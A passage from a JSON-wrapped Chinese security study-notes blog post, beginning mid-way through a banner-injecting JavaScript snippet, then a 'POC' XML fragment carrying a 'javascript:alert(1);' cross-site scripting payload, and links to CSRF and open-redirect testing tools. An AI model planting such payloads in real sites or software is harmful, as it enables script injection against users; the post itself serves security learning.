!event.initMouseEvent) &#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\t\t<span class=\"keyword\">return</span></span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\t<span class=\"keyword\">var</span> e = event ? event : <span class=\"built_in\">window</span>.event;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">Math</span>.abs(e.clientX - x) &lt; <span class=\"number\">10</span> &amp;&amp; <span class=\"built_in\">Math</span>.abs(e.clientY - y) &lt; <span class=\"number\">10</span>) &#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\t\tdiv.style.display = <span class=\"string\">'none'</span>;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\t\tclosed = <span class=\"literal\">true</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t&#125;;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t<span class=\"keyword\">return</span> div</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">t</span><span class=\"params\">()</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t<span class=\"keyword\">if</span> (closed) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\tclearInterval(tt);</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\t<span class=\"keyword\">return</span></span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t<span class=\"keyword\">if</span> (bdiv &amp;&amp; bdiv.parentNode) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\tbdiv.parentNode.removeChild(bdiv)</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\tbdiv = banner();</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t<span class=\"built_in\">document</span>.body.appendChild(bdiv);</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\tt();</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t<span class=\"keyword\">var</span> tt = setInterval(t, <span class=\"number\">5000</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">\t&#125;();</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>POC:<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">content</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">tag</span> <span class=\"attr\">img</span>=<span class=\"string\">\"http://travel.weiyigeek.top/1/72_1.jpg\"</span> <span class=\"attr\">txt</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">url</span>=<span class=\"string\">\"javascript:alert(1);\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">content</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<h5 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h5><ul>\n<li><a href=\"https://github.com/TheRook/CSRF-Request-Builder\" target=\"_blank\" rel=\"noopener\">https://github.com/TheRook/CSRF-Request-Builder</a></li>\n</ul>\n<h5 id=\"Redirect\"><a href=\"#Redirect\" class=\"headerlink\" title=\"Redirect\"></a>Redirect</h5><ul>\n<li>Redirect-ByPass:<a href=\"https://github.com/ak1t4/open-redirect-scanner\" target=\"_blank\" rel=\"noopener\">https://github.com/ak1t4/open-redirect-scanner</a></li>\n<li>Redirect-Test:<a href=\"https://github.com/ak1t4/open-redirect-scanner\" target=\"_blank\" rel=\"noopener\">https://github.com/ak1t4/open-redirect-scanner</a></li>\n</ul>\n","comments":true,"excerpt":"[TOC]","categories":[{"name":"个人规划","path":"api/categories/个人规划.json"}],"tags":[{"name":"学习资料","path":"api/tags/学习资料.json"}]}